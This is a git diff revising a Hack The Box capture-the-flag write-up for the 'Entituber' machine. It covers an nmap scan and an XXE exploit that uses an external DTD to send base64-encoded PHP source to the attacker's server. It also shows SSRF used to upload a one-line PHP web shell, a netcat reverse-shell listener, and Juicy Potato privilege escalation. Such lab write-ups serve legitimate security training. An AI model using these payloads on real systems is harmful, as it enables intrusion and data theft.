@@ -1,5 +1,6 @@
 # Entituber
 ```
+# nmap -p- -sCV entituber.htb
 Nmap scan report for entituber.htb (10.129.172.185)
 Host is up (0.20s latency).
 Not shown: 65534 filtered ports
@@ -13,7 +14,7 @@ The web server on port 80 allows us to import UBL files. This is a hint towards 
 By submitting p.xml in the web server we can get a callback to our dtd and use PHP wrappers to read PHP source code:
 
 ```bash
-Tue Jul 27 02:28:04 wil@pwn:~/htb/business_ctf/boxes/entituber$ cat p.xml
+$ cat p.xml
 <?xml version="1.0" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
@@ -23,21 +24,22 @@ Tue Jul 27 02:28:04 wil@pwn:~/htb/business_ctf/boxes/entituber$ cat p.xml
 ]>
 <r>&exfil;</r>
 
-Tue Jul 27 02:28:28 wil@pwn:~/htb/business_ctf/boxes/entituber$ cat fileread.dtd 
+$ cat fileread.dtd 
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=management.php">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.10.14.27/?%data;'>">
 ```
 
 ```bash
-Tue Jul 27 02:28:11 wil@pwn:~/htb/business_ctf/boxes/entituber$ srv 80
+$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.129.155.192 - - [27/Jul/2021 02:28:15] "GET /fileread.dtd HTTP/1.0" 200 -
 10.129.155.192 - - [27/Jul/2021 02:28:15] "GET /?PGh0bWw+DQo8aGVhZD48dGl0bGU+WFNEIE1hbmFnZW1lbnQ8L3RpdGxlPjwvaGVhZD4NCjxib2R5Pg0KPD9waHANCiAgaWYoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gIT09ICcxMjcuMC4wLjEnKQ0KICB7DQogICAgICBlY2hvICI8cD5JUCBhZGRyZXNzIG5vdCBhbGxvd2VkLjwvcD4iOw0KICAgICAgZGllKCk7DQogIH0NCiAgaWYoaXNzZXQoJF9SRVFVRVNUWydmaWxlbmFtZSddKSAmJiBpc3NldCgkX1JFUVVFU1RbJ3VybCddKSkNCiAgew0KICAgICAgaWYocHJlZ19tYXRjaCgnL15bXHdcLV0rXC54c2QvJywgJF9SRVFVRVNUWydmaWxlbmFtZSddKSAmJiBmaWx0ZXJfdmFyKCRfUkVRVUVTVFsndXJsJ10sIEZJTFRFUl9WQUxJREFURV9VUkwpKQ0KICAgICAgew0KICAgICAgICBmaWxlX3B1dF9jb250ZW50cygieHNkL2NvbW1vbi8iLiRfUkVRVUVTVFsnZmlsZW5hbWUnXSwgZmlsZV9nZXRfY29udGVudHMoJF9SRVFVRVNUWyd1cmwnXSkpOw0KICAgICAgfSANCiAgfQ0KPz4NCjxoMz5YU0QgRG93bmxvYWRlcjwvaDM+DQoNCjxmb3JtIG1ldGhvZD0icG9zdCI+DQogIDxsYWJlbCBmb3I9ImZpbGVuYW1lIj5GaWxlIG5hbWU8L2xhYmVsPg0KICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZmlsZW5hbWUiPg0KICA8YnI+DQogIDxsYWJlbCBmb3I9InVybCI+RG93bmxvYWQgVVJMPC9sYWJlbD4NCiAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVybCI+DQogIDxicj4NCiAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiPkRvd25sb2FkIFhTRDwvYnV0dG9uPg0KPC9mb3JtPg0KPGJvZHk+DQo= HTTP/1.0" 200 -
 
 
-Tue Jul 27 02:28:32 wil@pwn:~/htb/business_ctf/boxes/entituber$ echo PGh0bWw+DQo8aGVhZD48dGl0bGU+WFNEIE1hbmFnZW1lbnQ8L3RpdGxlPjwvaGVhZD4NCjxib2R5Pg0KPD9waHANCiAgaWYoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gIT09ICcxMjcuMC4wLjEnKQ0KICB7DQogICAgICBlY2hvICI8cD5JUCBhZGRyZXNzIG5vdCBhbGxvd2VkLjwvcD4iOw0KICAgICAgZGllKCk7DQogIH0NCiAgaWYoaXNzZXQoJF9SRVFVRVNUWydmaWxlbmFtZSddKSAmJiBpc3NldCgkX1JFUVVFU1RbJ3VybCddKSkNCiAgew0KICAgICAgaWYocHJlZ19tYXRjaCgnL15bXHdcLV0rXC54c2QvJywgJF9SRVFVRVNUWydmaWxlbmFtZSddKSAmJiBmaWx0ZXJfdmFyKCRfUkVRVUVTVFsndXJsJ10sIEZJTFRFUl9WQUxJREFURV9VUkwpKQ0KICAgICAgew0KICAgICAgICBmaWxlX3B1dF9jb250ZW50cygieHNkL2NvbW1vbi8iLiRfUkVRVUVTVFsnZmlsZW5hbWUnXSwgZmlsZV9nZXRfY29udGVudHMoJF9SRVFVRVNUWyd1cmwnXSkpOw0KICAgICAgfSANCiAgfQ0KPz4NCjxoMz5YU0QgRG93bmxvYWRlcjwvaDM+DQoNCjxmb3JtIG1ldGhvZD0icG9zdCI+DQogIDxsYWJlbCBmb3I9ImZpbGVuYW1lIj5GaWxlIG5hbWU8L2xhYmVsPg0KICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZmlsZW5hbWUiPg0KICA8YnI+DQogIDxsYWJlbCBmb3I9InVybCI+RG93bmxvYWQgVVJMPC9sYWJlbD4NCiAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVybCI+DQogIDxicj4NCiAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiPkRvd25sb2FkIFhTRDwvYnV0dG9uPg0KPC9mb3JtPg0KPGJvZHk+DQo= |base64 -d > management.php
+$ echo PGh0bWw+DQo8aGVhZD48dGl0bGU+WFNEIE1hbmFnZW1lbnQ8L3RpdGxlPjwvaGVhZD4NCjxib2R5Pg0KPD9waHANCiAgaWYoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gIT09ICcxMjcuMC4wLjEnKQ0KICB7DQogICAgICBlY2hvICI8cD5JUCBhZGRyZXNzIG5vdCBhbGxvd2VkLjwvcD4iOw0KICAgICAgZGllKCk7DQogIH0NCiAgaWYoaXNzZXQoJF9SRVFVRVNUWydmaWxlbmFtZSddKSAmJiBpc3NldCgkX1JFUVVFU1RbJ3VybCddKSkNCiAgew0KICAgICAgaWYocHJlZ19tYXRjaCgnL15bXHdcLV0rXC54c2QvJywgJF9SRVFVRVNUWydmaWxlbmFtZSddKSAmJiBmaWx0ZXJfdmFyKCRfUkVRVUVTVFsndXJsJ10sIEZJTFRFUl9WQUxJREFURV9VUkwpKQ0KICAgICAgew0KICAgICAgICBmaWxlX3B1dF9jb250ZW50cygieHNkL2NvbW1vbi8iLiRfUkVRVUVTVFsnZmlsZW5hbWUnXSwgZmlsZV9nZXRfY29udGVudHMoJF9SRVFVRVNUWyd1cmwnXSkpOw0KICAgICAgfSANCiAgfQ0KPz4NCjxoMz5YU0QgRG93bmxvYWRlcjwvaDM+DQoNCjxmb3JtIG1ldGhvZD0icG9zdCI+DQogIDxsYWJlbCBmb3I9ImZpbGVuYW1lIj5GaWxlIG5hbWU8L2xhYmVsPg0KICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZmlsZW5hbWUiPg0KICA8YnI+DQogIDxsYWJlbCBmb3I9InVybCI+RG93bmxvYWQgVVJMPC9sYWJlbD4NCiAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVybCI+DQogIDxicj4NCiAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiPkRvd25sb2FkIFhTRDwvYnV0dG9uPg0KPC9mb3JtPg0KPGJvZHk+DQo= |base64 -d > management.php
 ```
 
+`management.php` contains the following code:
 
 ```python
 <html>
@@ -92,14 +94,14 @@ The following xml payload will do the SSRF in order to upload `mine.php` (with o
 ```
 
 ```
-Tue Jul 27 02:31:18 wil@pwn:~/htb/business_ctf/boxes/entituber$ cat mine.php 
+$ cat mine.php 
 <?php
 system($_POST[0]);
 ?>
 ```
 ![Commande execution](img/rce.png "Commande execution")
 
-We can then grab the user flag:
+We established a reverse shell with `nc.exe`(previously uploaded) and then we grabbed the user flag:
 
 ```
 PS C:\users\bella> cat /users/bella/desktop/user.txt
@@ -133,8 +135,9 @@ aUth reSUlt: 0
 WUT!!!
 ```
 
+We received the callback from juicy potato.
 ```
-Tue Jul 27 02:35:00 wil@pwn:~/htb/business_ctf/boxes/entituber$ nc -nvlp 9001
+$ nc -nvlp 9001
 Listening on [0.0.0.0] (family 2, port 9001)
 Connection from 10.129.155.192 49696 received!
 Windows PowerShell
